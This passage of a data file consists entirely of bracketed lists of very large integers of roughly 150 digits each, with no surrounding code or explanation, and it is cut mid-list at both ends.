90045797429309407138937396016601533814362359712431815677901880812384552250773799620390215278180653171906663575397891239944811556164230793464554328840877, 3440840604636609729110924493360148268050575721660024919255792287182444142531319696571853642675388802516063768790324567167161122097731449168661932140164936, 7574772984162037542845120995995578824255621874087167221065176563769320153564852221656109978475579942609180439544832720447503566371029368562200407500857793, 4837857029667354358746143820249348639336361440911982172366768416231226749056078548533536777200478623498004072453228421371074816699694065376421216421296805, 557978367180400000615576519246023221722772414246696207644701657318042326323768629216584220893872842363951476529469225557062087368707492832178336234605281, 7039766516371193823481814320140493847036496612704723998902205004936985326950858531568010325238508357709460494885286688628064953602695957885564300196265158, 7989144299354815303642010679353355505866626064766724420636778458300914049269394829383372212488710990629495200796612514672719389597802919150875804357130060, 3146382973626035733936527390957737930559690548881592906923372476791921984632883545931174738084173834750687020815933169856226982500262722190916824640753390, 3069094516274677482460303567229261497524863616024167909978362743835967364457419005014655583197624391670741169230233962363448123872259968137150064645637099, 6549752913404278566313433606057189657922523725921696307207551620133522549752223109783169456741808468283109403873803895761847150506594473949331687476211825, 2722585445715792991515257145944884642706874880490564580065708403256971023287041204467312056656339948854876530568933257647015923976831759204670121849661679, 4861039243737309828014381740368461680557375375930752818725438688898792623945741985425008766987500664853551779750779315507356456772723232053156229428625260, 9576409867254895583442800588379012343743515288431084568406292335205658615741158218446600829595904917326542613524935608231172323485177055283163953316133288, 7885128248367886133723932314188301382250243490591163745426755184029171071514812202395999349712003632258353647812368952651458610266186152173133526884278772, 10054140276491352207879733706677389913876950700123163452340978722388189666662782924652970269581774798037088823609919332460899534585162018372100914557248796, 1313448916478915206147200824153533480113912013144706390369524135745365012583082926609964534601601646404142218440181156004682436986323555030854215641770542, 12827118730866897436874965835522165360581836690230211088284449848329562718740507626747570331182765464051577765395161897313889115673824607745000284299361660, 3256808923922892656303795913887194565322473569352211043029944021587067428678543737455389046868194443547860350262450099851967987660404418491232918783671754, 6848869065853034454111495836451800444132512587066529256903487106234661000076332864503831491825126334471160133605456646225939709860439009685263791720379646, 1490554623718185032196589691442859749053379441244402962977630721650205286668427987062225419220112472837250239644726841894488045578980499565497115846520743, 3870438185026328482349371531681577365636133940958630079377561705046462740456897910646940731356030896237798779534907150415231716257535199844842006656300215, 9672515698801481391933384249423001096292661552093351523765813712854767768497541129497648472720614032268417794269710590208594072514075438062233078314149501, 6598865073278737718304171251714817191561375336985379976535598802004270653221463755431028760669656705492316345421088197676285504509327347871311458611383191, 13281280113035314753753729856326243522871692666778415694427134381565618282019295824327005091251682483289859126600267614460988602719869016036853440460293541, 1215838827288877774556637220533470870953528874053599842113676487717186141749004889606483017521505774287919459498546624238454287129925204088261292814813779, 12232990417324965870088215133546986704928353813336047003460803443841524961401256065842180283423893851756208732850883779093251434644240130507683252133538220, 10633304784071529735532102411137082809973313075226616303039982371746270778574605728506384299813370349030766910932676719827602845686633000598428630263563723, 949754643945687402592609717938278174703523457463128191830987979878556910025802121981287777079367952577338851258769776262369256559405092911650878873378032, 6131306040069998983331595721397243523025692252207931712344697839553669939336409627202352221564110378757953204482207691339198600669698223468832253475217423], [1264374200043174488338120980889229926748408333377285750313126698000754516689625321495839274480609199199222429030497657073327915950886379753746872143614622, 161347761489223235988370899074630203575360829997430237319128868389113793899276615058713704483700679157457172980887229936724028703634874713552666162231093, 9134311202172772621980746443070453072539612235674249139770422825187186389616913620570545946214731010365656197074205291908854824528810267523571676535654204, 6396384339574996127112516552204526664930234289783169411888586045629539741818605148296786616827179842978702047988079127223656341773658679569480617349274476, 7670477541104210544189770473782652596940885492625368965893315239664552184836794055479237196149412956992767115004771955463764813718566731215646026746848703, 327203460088810627297759722702067555610647711841645889675476843259886270218978091305936860643457909266485911230445143041935762667226439893107304689224355, 4571591708350297868538044974332000964730262853499905440366587266854987130345032431768015715315291660642386389496239680402169149980090456672983537397289894, 9503178334149120351300580464286058075076274286624736119931032651704159144241514973007573952851185428513049121878080725604202102658900173878974995866540701, 789635903867075888221520921422418679024216696006949871683160997596503020465155235738030102360710123739253778771609090189162787337113188878298956380097696, 3053735024780927862158001153118383409923549846596818434633895696019005980856673878867693109050730059369693024948897969226936210690417898553145992146229166, 1012268281962474645024319018303104382186545257816852540160791045189651140565844540182066963154038306828238115960192010417581396741817564794463592278007180, 6386565560994265460972381945032923050998116539795978098100742096666952730200577739375427648026003442145581112680344654742790953791979125176164585752158334, 731476447237367999683260028777702118390442353492507902012358272634116144405992896062340766545750279415912366439147491600470570439192654048114138392353687, 1561724698593514954568919647863766122046494755505754214422437159011735700716339197047355219944250476566832131746473710789294733726234148255616382643328057, 2365796514882048299263922564235011469382241394825373638433693362483399439535738757693109617287717853745095831632434384427546208577419205106364041288497587, 9333982841313356094869436382783511701788451226753981924999522517839838001991739271216117783861806024839728283195436455919141152916619096992696457994258892, 5043370042302164811985112572681702704160103407475919709702265095792859907659495115813815252274027184163469796723022696546631858681162496435580120515370603, 7743573506112463018784498896708205978298956645600333208058255110739696362433069135339506481440071293878252409674734730764247386019287233059073835569379828, 8767699362922529915376227327403213372831884738940078766847503987098646741098838201735480133747681314149009707156471128076935777630454340839735157587309024, 4669115845848294284594788585107959282103204089746137416255977971946289717951639855614838154958280621747946003905486988967438254137892249338555843991498180, 6457037709782951191768058353370784189273247393045138159867991925082452350135928229095319161909629635328872050543381408752318314267423407548042239431987402, 2806820646425944810058069554087590499006406412038389496757764274593154939817571526541535830823803389011824969946414231496041620856056403167216631593723300, 8825681049667319868083364243204709646434275075987655693609436892649998425893543017848099330231413729263799055871987761859059367476904490024017742373160045, 10881677043584376479483751195555936528992545193099430990090713415404131568077019085236096228890818568980518243026565242769401057971237404528320168583528372, 10748334309931737240696053671200766049458174254794837834406856730260623809412505443150469492849314967941853490428938588327436194860090023957136820679882055, 408146781326816030516909087552500144847859837856607569345190857138357498054456732024781366915372545563587455071470588413671080667885123635400253850947850, 480766583987386068675526845580499311136310365912169850035094850436707831511523259459455297287882691665290632344545325721455879573307131154824389104337816, 1098389820431082286835380237686598280521180923426279632670178771948868341656418932080242175259396938597943726631965085055251914068341079658280288230158252, 5933277607881772584884934918401127512126464748408749366033299245708241504318184888222889389220777926927583746407009347657439861455709987872818151853098445, 11526105867158255653572418121984253310351832599843680242537515761888985045516601746571713818022267080345548148892025553702762550242705030032129408939525542, 4802174178331036968359452121108024515766324394873708182580143544533409948218416748035909514277370591360382983617366470338689497022370115205957101708842586, 5689383958373078778862464861826513314132610482650555573806593901155604285195503895653629138937911295109746155834402484834715989986188430859697135492731605], [5160779706035730537277175429352463765365060052601952819911290121315837031630093203917899901498857698588575769295632309750975913880765617970679320755579757, 12394471400573632904585618213801234386228274756616223647986823906695961121212948342414715584656496083369473104105712340233255749127212849488222187372120, 4451774219104803266274628119676684770099308054936198995579280085359200688336509367630852294836781209143412535508197214798827963390779377738635827376469498, 10876169633223984666717887710402051738208778858439964904702051149267945705679248237895587708806433804039361310957508759942425553290501664854233079033996803, 7567228583119989535500746985807280543455471603497486702271682356647259545269680845119791067048553756928484517026959804758573528959328046426509946193900382, 6660920723689911299791650557082029456516560637768797544227633099407206092802893075821885391870913768147167059619291336801751753063638079482707538570949255, 11888747917352381296896803986441062321431971380861804984163214937615350770248981057868093325761452742074227579123805614153798191020877001358132214351751265, 8050359562108278961745845604929681495048024600587726809469120470050546700598006545908773027741747177075451785563279798507866398731164257655071521832129089, 975157353691563077162753781083865483409589266142652409492491819766854394527161788047183923013601626731161920113515170529850015407666341108716585587080744, 5084240440674709867554297868161230295487092911565295193118027982529517131871657278347851587835675267216145620918910295936806444656565012307742247181049889, 11445722083557361688629930308500282597447390650670710799627389513989153703838511667156110129116204821773824798163650292729032010606416433352701749686215362, 12361309822517110873563386239970482657894177412682862420293138018694757740079984710089912692364322772432776647638786168513606407863895423571656425697080421, 2921458554153213859482111732862242789147803565303834420852968125935365502606043123158608670730038141625595449118441990696198728648087180066934706006913722, 4234401154323735847327742216455365834514891557089172374141999522143298674495134123581261903883367873135946814009127031315252921428657263641714270763291933, 5447778830500247553871749458188180385752182513484741451679873676872526478406493514826938734539101619147979947092253266182850936981949637954998219938100170, 3123285900102248962642451506781100436496366708770403837337705137336799720193373122499080971991326725533574777136365280128537336781989298146518772418795677, 10109907270557938739902283396090711654060048556090389513190769952551887673396284722194241995070835309078935726286994561101211462238084735636566443104501798, 9945038949231217817970177315369390528951707205190687958882960914988023832555149430856995626464436783507588339627992751650962482736492490018387253540852099, 4053521813998767759619268441860985535098563438947699869343087809370162318682661898968890525503665706465774037749120023555918584503777554201644810719882693, 7479222275866469128901101276339809690241976328986334205173342421291380357978253610706533659491163595351406803768826352345070413474370800731668042797193469, 6120510733066210619538027324069798874712757404660960664042625647937865795143589620208726274097706243229891506756774149684148925266879202487422737319402865, 6698660899210928878098098337734210571365875322353781450439394978973942609980268388765720031875695061834865721189196289311499592427310486139684233305386669, 8054022611803496813392692145561110207813130972773764486469955519851925559733117018645063039623137789486589678844746844288592253524269870289499680437429053, 8099760762875394320491780435258969599440260640973817156748409531967473258255083999611244906770815323522127651212503975989917903699042976612990061019245681, 9496071308708566719207183351413124918829504417127358026902700997742701388484255204940719331885410417277794940409336778706990983969830752344067499356675831, 1250182337825543047920235508592861540109397223295883518680164027380882276199742196184934605953380900184563673051367002010825997704636777395569870901749241, 8260572579727221354726835175040741154909286925507886895172800468796665500666388364923519064057655324347964601193307438624549338775955004096531704361360277, 7586469052567576540872112258835748846583793467730418712229589780874227050177644890613898526221689826551514204640809211906444466040590640717725229836048618, 11469277107976555555118701732259490081762597077685637659308218545009991672238172080672232724738389651658275511430599717399894354724232056816715136797099468, 4003444730503957323385625309842358914451241280914487055797614121125004353313656976436957639585587413813431419839097518850166872503293566039614984594684569, 7809046431704775765856997768584583622649471893466374774408058471755418906495719445760128899660372104592092840475708599411650690563061887128507701609728357, 4938235858856580660374193191789357746364901859087465975744683139519220938461332218455562096707321913279807026274453287533436812669820889665786941124614506], [1955554796435991556522522053920164677257433155257257209740962570748082311712624750394113031320989606770288748666214123617551815837950895981179636254540870, 4805823660876439684491999668692126659916660434599763652218551288371152424448681984684650333610518630597259956064313409230962081393529846804907103845394849, 4115338751276707515765396826309026687445298351244987052370781656110102355653300646925713673705735208976646769698064000481147581235270169190626444448745827, 12611624902477623206696108260345653700621789542743520511508603703671520647990422869110596546551929300241512304991589077471539303712682271310111185211198497, 1888146140858997798274088281708223465892460298979565630167257661731466286920978545360701659411900526855078987574985489507273232887589933754259062969237426, 10073631497502372709435103610574838414983658222600947427303593649726332821764324584089631656298300118089343454132852099818413019822280534191293653742133567, 13007146167425273767208857654728848742761401061475702620276854414489023098185950169105736307097464695521106023527952912285768838583649504613428344637949321, 11718581544481397828809817547275142295225201154518121809798296506043696628547883009178649997572175962952386089858818807935846242972233033917323493861411815, 11942761238722636252782529394912038211222015472769069482770080581368140774271001980754223727870684794110572851765646187693049717066812588097532698345109775, 12053171365075651185430548503104634928246642634218916223222563457841585264154620539819373560520620116257483289052307993499411552525744324790961855180390606, 10451466072035908939094065732805193193815947260194556144778696039187322697878313637297802383111550665404920481408030898115384846918654022092175270970818575, 4894761258763659058462928451052194048728319201217248402909624011861725858197979538668298765339778471133229108301356040235726285613189346005830553471109816, 12443719393475005858938426178064529729840478111419051299228041243358655289800171745085822182428231020206307673046981299105245978710582101824816582212126507, 5292263933726388615205441625034253789745752975632983809925542107319033365142228984209424334062132730534394050810296164531180009098991895891425494627258051, 2939066244982511905399951777461320204792171888995349941412156298560378629920916720449227319050911592296119164283172042632941869995445756620466711964255791, 12594726025092812541862483900315876906572624950807917072586869989452276152916261392511258523741486096445017850527808188090149729860690552514513986940344889, 5803354128768836141042716567747170406390627665842438487320144188624202756237729185304907167108168198330754385851911346636639345521226935810391392316632380, 1114401827430451824532835665564223573908101461194283463064604009236812269456888740276384758656186578982829188281472834136170549948259329468153278750558627, 11865879347462415923156220507935244351803737747493580860200629547287586346735508614010150912022565734898701170258019397748352797898242024705077990818769680, 12847241129142246803569420983280190938811176464115807216016092288969936901350792355490010796203014440782880726432342623965947032434129058567270305574258999, 8839268415905580600329920185637640348617971834876598114605966090329308609357888997461409095447066889786810828539915909268534181145733212030632743770887001, 2905722504420260838532747058652836714079229639351233219138942056243563866161764942912077199692581308859309038693478405834593769033251471842602803709942695, 2666698679228539020026298599691950116582080293543504312889339754277066411237617589283725482388899807921689420405353762707138173602822036591561943926367801, 5190116496268641035300022803762200583011567685757880709045930499925435453113535376433369496105516764238830987910382006390456953913018214645800426184332587, 7232745684660335383849487509812256106366752433686301571345042614191249494982148444657381717607419542801986049310531577434826260799155004210544381885033621, 12834038013439369217591574873014091647480475501467045831670556360953639528898282974595900441432235693425756537716366438069795467535453713239230517304181927, 4658827068164497523201866489600927238531809076181815879304926151756328968962991309977354139704165902708094395921658326727857826393466560364783873493771258, 7378317433816290181843975614861964921156473379024213844320497261301571525515150156762952767208829295322905233261810379112538262456934285266664786017170850, 3896003366233627011613975291799998612109419105807022569673616772339441649365175450056634321871300681446631127399197493248782528322604682140756728572967760, 3009932856758141071690431370883755960395901312014684260356487655177849608956414351002344399810609920157525042884030601714318491078102990568979874222386996, 2841958329375675936435926215933000246520562823442937220708573845011687397303651609292164880068483065751484658259385587291876929963137038643682867417894959, 9680397518807090954465979654178282431308219690332008465229209376391527498887705344914220149277476556794472098143745509816763938699625351208781893279966942], [1449838633688650457208193328411320348133920471561241835579889886254344115019055397585548775469400524999243881869871279518408984270799907351474626764054011, 8662246226210560215692584839044305523962900100390724891493058798277422593404131881420884818436074679016390737159613666885764790248383251223132888175577229, 8910805351236810280913797989005005093797847740096567353629718409862834665607541863855705510415560871781876717172994084692915292665535010657846487694658433, 1008969573804880474416139858495504370060866627724588473351365228164630913796727123247969000443618975609873907937342461337888547517865963114743711150296111, 2161399492081002631022633890740861404380563386437989149715702263968572674687337662384844730114895451859069648947060117001890364290184109994305925319370564, 12851380397981559706610931610305941329700674950678129031770120626170586826824727292532366350305130211283657805441643174438380251851964274738834073168422952, 7035477446698974424496859228019538402458817475204872561816060772478910428311766565411381223522047585060877849339903507445878109342853348455474233387713762, 1177430295304297736607381187738208034368337454359460757210197995210745602839771022759653189122022892115572837747840362064152352589036679457622886846839226, 6629938478904755172919440802063168070846868123079811779232550266007526258914333050182861841258307504344798493044446911030972448230344528204492918452275118, 3090524110339713507954142079511789781909438208080791244426754670957932908970302750836890695168292836861556585360258073964420918581960394669570756990417066, 9732289178160951262959069190133635445408586257776144191532307554724640256030036840720056292366955890675127510950884756877591835856631748729828104642783698, 12710569956922179914935863728995438402545230955099806172980366416830965217370490126852231962818635557770271550131367788033126444476546842656906193097492346, 10599765838729173875700555036369328359138800714274612762099018228111457277743558915178824486330439728160779562101651788945481734719793183485596205931506392, 3862550922894687607718555380561353168278891658477694242108177792214278879373061630607227618422131376668521042061535724130165158175643514118780464975041864, 5978041712614014088417104875786611835877046789701544458350868080533898451821169406474270747565006680652587344017823145450524249138739080565379394908354749, 7180055227165072676954619740732597753663280369818382252434252202610228197800573541893002385394280761110585839085154162475035268039208488129007513866669100, 5092902106725820796829832431577288546292291088330489897855888815022046562849640941367476913592874334535096718486424963137414586044498696112994082491270861, 10825393064433940364989500575196593951405767938081536760984500924812181341273126925861581791308360336387264211746875567221410266033875469462370567460756909, 5156697676097939739522602410242379483956385186921218190440575178542234043700733767888203346530334358007804442878510283645572563606988106012879006860637978, 10827486902781415483811976975221826811540786825757786070539284474285805814064437120601434215035395321136368179354333382545028131130053281617314463456108563, 4044701047188021465276778971278038355212612079153018959837378875803819717923829044017715768490466057101133808684715404995377613100441706507537046763639858, 6624911498740213445980667553215092879073680775128587923574987512902470156524518671210781455041419837655330277867830058757821602344264861435624004415335321, 1141228960174426461849710802996084255320610616485692775467628237824094460547160779671968285737409276977361174338592016214691959003285276440097606540408431, 10969827752614038505944202215811415519189995695330117870213526899434113283994604273106580934927753001670883848624733671047974354835826171760276232473288053, 10783856003186377398503354231327062805802033863548738612714403901667403340422905558092528015211078812640269383298388299306697036353512554263121724116231870, 2702699167963319603570521368575014375562136202680038338648343132671618038153439032013876500039892950482334065385027629069541956431384033246678329086530390, 7283326905769763140169017214645615748270803686249741496955814691806783284558387588874709361232832466843554663413799463799382843286665302745686010078287353, 9169083111814499470116515050078815426268942728966017474208505405487093651867341937517485611281472120887429887345800843674339362033681372763337411284881241, 2694393327682838785958494496061350899089894528134230258371075228404512570631224130762596057962720386710691323182205997482063904573988969303164638373705039, 11103063257371679426220580381702991204040376175403892869463743126323242023798063455794886881806825820464225880835073198337918878894730246090639752857763022, 7931330037909016402311999764223713597607406996548755005723653380398853206401928205285172800673830453893415072739169334561553478443680390340349604212249953, 6730481773188934376571955350978046229817611901607446734751001426155436004307241936263829060824945043532367833347878009579697368724597669918247181819270427], [4150179292139680746145065066444089623825021481547290345819804053931042031754655771767524818659463593532507421271099413275008862889831486828894190800215510, 553457021918447471336338661925903576239698610568148476314657498615593079123546676893080118379762254930131069367248949264701536536696042049040404377544181, 1505148974772975041522884560359282268166829977928603895796221735386132771092510119347144385932194817294906583677940899712019119106198131691963586134367321, 5762296576144351965030382193249998898612408642103867099883361006386037853425329778851862930621349663726800759114171221272775936372236031720422958251353587, 2554297257992939742424987651441460142782967695096590773744175677796843851476301507979748972967351828729488794191857344455929964697006660579726311057221944, 2802136341459102379858888867139837484830694170457792569038154563485318294915104194762070247624577632423512591064310911786212873492485169779386320767477763, 11889264971626138544234717542646150492485064155048293124317927786113446315125030164002961531669730928145421920230090481312836498474646086334326967536088325, 2730540280303080010770270806146792324157476550100475574144859564640492750155682430537685268506512342781779523005794922021664069211982500064356816838332085, 1361068800513275859673909738130689594228015104661101973973792824544245099732260371077648544977215978024746610268942387210532209205351710329456475295412837, 10485619006146519959176072381867336881680517925988107046715439486382622086093884730924172786296622755859798772927592640464255205788929548051566530887358534, 4551767566734418964280359424872173570474964111286202875859153364704159749823212824424145640766855285622654657380729386593205684443625295288274778360550116, 7330350554111483633835622780487276282976599206234713061131351841930083821610716829614107484592183527053683090199226815092384509816977559642069366155983258, 443293709294415590763920082968196644569797200485449306835825693805774500557744686468215190507916529555481179135472148465718339356088841227871513956938232, 5463507586152947335873187487691881487644651746090414181623137318579563013707196797696224793897896140118376429002978373462412980176995948124737441236634082, 12834108202779663864909903004132162509110161697498127776419587615091175316356141602472998485973543987976652457422606301220389345978357980511949294337992471, 12655732219926104788635751093181984133078250612180778807282044250387727614615725980003188304989722974891102942715802658837137917049192080744042133440129165, 7930933244857549625876085140187668771050970158746294082064285481174643353762363424855762005966231602749110107270141087457121478215332002174774765971694742, 8695757738613415799701965472060931536306561270092797833050421338322478205226365985934670147388338754589852397892862211976435667888777930310926538681612550, 12718930562326907755673385508159782036191105001456040316681408864474333768337102184083183242759971206414066108118030533245368815011055897498137617869092662, 9943654451220908313415156584397541067551034623504116591568546649765024385949344462915201113797492152776067915985006369885987074014551230842424826840920268, 7836605489309139422539564673523639984617057149966984894043092707664078928078007071115709194152616069240032777737641401986336988937976593565193680576443639, 8263338217110368113135381530169173598279793440847725574836368057757963696734263282878447854712638078998348009109233334931632008730223063165783828474790702, 4313656990489278413355465299952635462119008222230466332167166546745844142106786196719053907371134314700153466208985566665136544480837540741432481479959883, 3565527797976323503219428637608155934567081776676126142292042848135742220839837353345427547989673317387778667939910496891150931676386797558575899956581458, 4254828368969973850539989559281653083841449736838579039781003711089891799700099327825006126448382214374197934303174982357066627354005635691639590308507524, 141805764521028069046328043968567489583422421405013562050576211822865672877167871533750508118713737390192378745967192472178118943157926701866864647623229, 2479784462070399935841119230089425861771507094391235061944679108550047796621199692972949925331319939904502414382227121483281548348997552706433635878786169, 4349788000963576111495963538507707577773823280337613058289951211946952037917885053868912174382530824069863150825771997474133344632911225812417968503951693, 11285097818115426908739598188577585038864987323445455779761460007836769050990671102266428094335737355297616590926913760111535521604683435372870492766698960, 5546460945930078786415393640752159942319450604312112097155180655971615538621826974066385923267681879119452057271938011223132150781221764363562013270723776, 4106911243914750528115264175011667366036226287698497841519102697378679043877484440917267390113102567442773143553670152188424999494249881920511583524603032, 6428045153807877327913858969737155434037743679123190510685840461993067461272757956988940703242341785760099534940852561289670581590070160116149680303800691], [8178427173952182318193946232944170796147337101614723546945192182017602736831883738952336241685079858333604498773766839602275520887582613024219443442745874, 9746730324991672010468047162945770203208539660978864743963928360997803392986897888489176140723824404216580386706316613207228083902595925111993036165202629, 1366070852093904756373965189470425172020046070503661351185856569484175540540048494180835697402653626795712514348896571137279905492952795408775986211450528, 2226088716318150452972803549868621809921175621297010500987170973383401275835448514584386024212364727554438394337528542206880686818882008703296262815868529, 2002240715032473391074291394208656218100375983888653413125956566730802936450978585680486215467230961846208400621881292903161700803841390037068833681597859, 9305439288496861912089198753358382532515687667505653288795032744252472054832114211735067920868938031529687400452457179418299494456920926399101622284235423, 4717242228645249706544700967808594762066556280426357104635237154098934362218806976504633011794734566871422385340541300004007172726620587916275243201271652, 9622482397967083257697482733076167970776574524324300918521180466872644116242832655854186570023636243358178147064485987582075479115464778734374374996007988, 1356810863052672532361563498860892219012632098284663398329483667636594008262890774631047587633030676272210588539781070116400611166648527587497335478279256, 4017584116441482475264089992348179761082970236014210277585713936538071915616160347449341443043369723299722307608282292240723229308486903970535665251368948, 155041317197982929898492579565789603914746330781105223443955398052984139001283695667215389718885778324739607243027987220311656284848933342790091588750114, 12618609794510274851857391280240447011000288810011468378001493588456873354825130948218751893149417668931428965979358074741872500144248677260287241330785275, 4764904827895116435230474625590066884561219979768287613774726547696286623053249847930508192318589666230765504536260973832042369722560003951412024408060433, 5115591056956069477986940110450459945799678385466804718939320240534705399452752191034970005134046807743069276137320370030582327520567739035752771136741069, 9535688039726017355293695930540750088782927683851262729626749693517496408088781036913194037787103856044092318205588594769673564298042288306452950779422014, 4273257137508730194414407081467350472325333367400955395350928622535188915473746683186231452440399208522156457886887967472546702962335237516898824301821064, 7879048516085697017987132739523538771566955926832592169429166647199107971067748210358773153495223483051231226324731348852728248095637211692646619155085998, 5752670583145553608900368107238872575554725855570394631570522139092874713573064379415902425206191835857018959538784327618820604705123575807820838857022876, 10608057446124219375789231052929803363349138720465808422397311356524952674156335903879275100473672886056646344851764681651978744426960521814122149048876138, 2528503164092103178960838139910070755515939988154741954074581690509508933396691104180224587073784807298913527356338806132962349955709439473310616330594629, 9481676061976702681558687502940774853148016207246497171135145919416020685456328965878904166310866007253919391522362735656339778001654987107068692182107270, 11144956734388337887094497512922187898468973998812913388396037558486265096250450036212651057078389366993270234824859284120830518337200191733291925435485518, 13371194436184278457494545077936663633653896124764054646617687729732527252643858859375857235260196045043110197972491134843550960117853706922367289937646594, 6003820977588647335535242470718571686350292467678832696142009747810638017145736145230116231911354157597395655147385179912907704128322011398154907924376867, 12232029838815433231714529395842186907729590615807475940456836568112821361963910184661783697482366372933402454525660503689040395026514469641100860920060428, 4362342684767582189597682279620464457339821751652256158377324666758470841973881288263533330656626350182785317279629586588177019415961580717299463260228172, 1315479544266393192218391940146523784370615211997716934019132742083072612272162954498692548797170977397726875739842937060919442462842791681543141682166360, 8511361703721371486557873484679817547813011026411011124914301585996673326184752116023194401127550433552419926081244721756420989895177481537038821445210140, 34376831488050541020610004636910370362402661955944294032046799555092274614032443338670677712147440970099821262552482763733300642923458450991058792770015, 4179884283445748663362955871268636566147787382575847615730237591456618830774219292102023957015933470513768978249173969247155464205767398496608040871377118, 9785661687836226506362941745934228255708528512823468797440844381294357067242283941587286388392177750759141546466840039544787868146064506935081354122844798, 6335901353274075960978851852579692434173466506400348441483832440838351213219099238172338197570439208821364383147019631775385347003696507627406227569830301], [8690281002683564972070215869971733597066657924193915644695684445152547223168826378504842331830730472631596809579306565479998873018410384881118770123984864, 8851752223863720113380235109440378956607095953839442359928164315151684150583814244845047550874361656361587951776588277754802482486935851502790844704419652, 10802882282809087388571036337177589406906734508214999071409039130116828960575906737122292539841357015105978544852614386576726263493834344744963762291444382, 3627372318596261643204391039343179024787671364090435996261044554506642289547114782572210686414738988818743279168069032684250261797366600584797141076449620, 7749864261615784239806279475409226158344800355519363970734253432763567732938445410237680655137692006935929273479098987284559124594334963661744948685523027, 9206819574759082799620829721870315202261571481663790552571328266088714380768458865658539823889562031187357037448154774477181814233321480763409581529035469, 9365706362196873228578787062336610249608466368321070940722811020480231050042362780323228790025059220405858664995012586445754906600753113392278019304580358, 340446305120998049245322451059338941762926245605223115690946398620833824660768884504582277475366539094406695666645012340303358372135165882465976366034609, 7442578452059255249832876670600418313676407419800256536612175220004303263910117246920753781815453675453289195649651721015639015406701899662308510232347970, 1107902725770024642945802397075333657493349824208386785395081507706531445512995403179690244748162280243451939214843494824355656342197772057862141609281626, 5313535124621272568738241009688271486385591392320233483060426154587913802596618042131151533306013798961878628464788593246794732341806303872965729043075297, 3586232821659400572169114262123784695982644929121515885258072309736114259492069187189431192535785477942524508287661798124750794766210266736820576446566899, 1810325859924926748000797968362181023280728962379448340830582906783781046805501141667747612597272475626173951301863398073340950309289059795344289556820974, 7099727754315618689538435817904039591084911638757062931839659662139744395012031968453590151593964096166848312213918399842787311510970649533508284304528869, 8182331624103752703884349616502053428125777836091502013735746834418633784661852670373113879746443320139781215548947571013729241198843474399616191188758006, 1527809338172912721421071335348217007341839401472869792859788075360907195649702628664614998540650174353361896160612282219407602370052844571482842884389852, 8913006508490400159847417116515646971980451208866386191277568049643305818396696585909095475843091388756059687859639106167471071427247818303765797320650190, 3211671841659013782994474882048696963839912825488607196666616747298131557497630422934092434183058658810769225148535574582076989782242404976410408391344285, 11057663214460820778767200537479193563063336609865926261131838943491136925714685788425719442765310227874039798488935079351213808492640533094607843692259464, 3849205649521724857430497706339228660034281764048697395589341805609463758297799473900177324598093665185350912274173213465225337927999775372915960176230667, 2049032674739880006692209609284543382641754405573550628298888027299647413097613563663786196279275250144244861481782958576254217358218930312289516162316823, 10897892415783281622578773904641636799778675836780812517308450579025134014881623086391489111042915383885081760036426562378483341544250962634958514477586231, 6967104355212089193858233325716715375118712727603701601765027221479365330178263406702467702139777149112793486210315683811431812198128982586922649694227896, 11046722524692080230183012248699263530059469648725956197357056846471387676592684810992022627955915600864439535887395118115749307806237794214265590606130638, 9439798700413967870809683817986587246801194027510279884151394948300362142850570444115922332282237613781936476789136382598119915248025726790966957052963865, 4755186691868184325228963965917929958192461022587429517947704794542480550865109298946371329011185384435770967554423670368268321872970963172344081099040153, 5718353500558160555094657633876764927255607542271920185372284436924587736703279767887815425202414201103329861956800832788080734977719412613352042092794140, 10083092500309676914244083101611586287117811194034091601712395854269846965355721488220282072411591275622480953096183637458273100865350832358893814352077948, 150576116635101183930040949703746229919605283795992744926854631484703683255135430567563806566408349530146857859366736477643751506921366190399237592140846, 12985295796635737835005444981861977385589541539495089812317729255426999175866415287330249516420027845533608702687803900721246859054196714131903577393161313, 2243627227143760003191764157741411811312700498626490006278582145071653111926458468967339838453479738273694825208599150841261461468180629953549452485111850, 10738541164492649922135766475994996895766874528597907783662544160952151987801471052300354723039596252725156323300315900655394812421406472780712139172298466], [733330846317561700893260696026391209176666086567179574589443653525121727745141882387947294877902576034813538807902522809542536115192579467692127925468479, 6352976483653640981977224202370786630255055716382987034679393458077594374674855129547380538952818085700316020947417587455094312443073583888130920790124491, 12427306586384039296363349316393961056136759652310197465804099543763843946014093144540448274484797512131455802708654514935744328049014580969106825293041699, 11585150910897883494490716596812130092784868310755228653700199085368164888471839488559604462038587945889242620377282262160488411532905055463906975230531399, 7625693815749841394769637868782695020381300563404044667456894901953444302290795993153401406147371494140389800404876525913799923491963224153630458058550786, 3953430969472616336990084307012652728685070735133702978970097177395753901738819301094559421238489936373853898842417335582742454057980958841264671639190098, 11436708034356437551448887907877921033538307257162075554349617994665535396519513407068906997398717550816821926032729309921547680057142131859661405784335057, 7506204401848276151350953593410637068716040919137234983431356411556298853296940757492857545530808388772157289475029263939186335821326806034192080002902929, 12276543580895715161532540482758765475609553848684553981273033424605048306603597337440243131536953954310107072858172795839466491678583951949283496532686450, 11179046914649590646481155212143054097486100738077199825172392388189658956463617104489300855143493545136590145123857889484576125705259587050188585983989067, 4527091553756019593762996985321304982257838133613776956847354763645007509125788425488937282198310148064554657809101298348423271231701264375075828877927613, 13355154556607282119409439455952423387649452488466367301418749879966666258048596915379293069719949124413132723884735764401633946675875140346001554066866155, 9020103551208898300531720737663262343421790943872001792257100555850775565794127366433724001847169128936544881332034813129446728668120111157063826655543825, 10875028191422885805641519812648516178404163934973740184674922232887809252272415135281335255913970428700999986852307901342682683207351810114584906988430441, 2341884216143439215714933888270690237944373333257371345448718740831837422727223014795842171605477246329075999270041484488639631226449013708092734683809113, 4216880111988908112672166005528974819685396005424161088346352648576081294351254732628496581328813670160120972152708006464495695003980711769967535344103993, 2867352388679764579823742964382878068461303875866974665392408679429892033165441086530576218241913761626022804438740146520344525330943696676023197766746419, 8943437043175216733561478761752130404819394575425133245441554203942899880633829845781194366958381597413144419621258899483579631385295091330415282795322749, 8963026030867518483204157979844099306660000133705936397874229916930789002024881725485436842629488007694806919859111590017883765022435616882173745735137428, 2297339318982500169540068045775709720082065775169813811530685485349574655637746106107757079041100966725998819084965663695447259223412624180552023492761913, 2170430190030758157860158456760082718922191257680549354378681371432808538345777068982350280531965001414080750727791600806732548116790670998766624541716354, 986542969986927206671859005801741863927534480869082596597704971832346745565445715762277088612534431676735414492770124297812813254010907042401411841752599, 3227926338954212697017870467220035484656177937853783795533414747665220530575128540326192917971580965252647532184894585873154404824105316318247847964134516, 10023984664214052362125438605407540130573728551355537716961046915589214867180512166334794734842861244578859313537226124256213328816030823355354543592049044, 3964604528410602361706307555869604457153444565976406527093047725869095664508779433991834699172844256031092765010111275161122582471582208372950336983697476, 